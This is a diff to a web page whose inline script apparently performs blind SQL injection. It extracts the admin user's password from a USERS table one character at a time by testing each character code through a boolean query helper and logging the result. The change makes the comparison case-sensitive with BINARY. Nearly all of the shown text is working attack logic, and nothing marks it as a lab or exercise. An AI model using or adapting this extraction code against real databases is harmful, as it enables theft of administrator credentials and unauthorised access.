@@ -7,7 +7,6 @@
 </head>
 <body>
   <script>
-
       console.log('Starting');
 
       function ask(question) {
@@ -47,8 +46,7 @@
         for (var j = 1; j <= passwordLength; j++) {
           var charCode = 0;
           while (charCode++ < 255) {
-            var yes = ask('((SELECT substr(PASSWORD,' + j + ',1) FROM USERS WHERE USERNAME=\'admin\') = CHAR(' + charCode + '))');
-//            var yes = ask('((SELECT BINARY substr(PASSWORD,' + j + ',1) FROM USERS WHERE USERNAME=\'admin\') = CHAR(' + charCode + '))');
+            var yes = ask('((SELECT BINARY substr(PASSWORD,' + j + ',1) FROM USERS WHERE USERNAME=\'admin\') = CHAR(' + charCode + '))');
             if (yes) {
               password[j] = String.fromCharCode(charCode);
               console.log('Admin password = ', password);
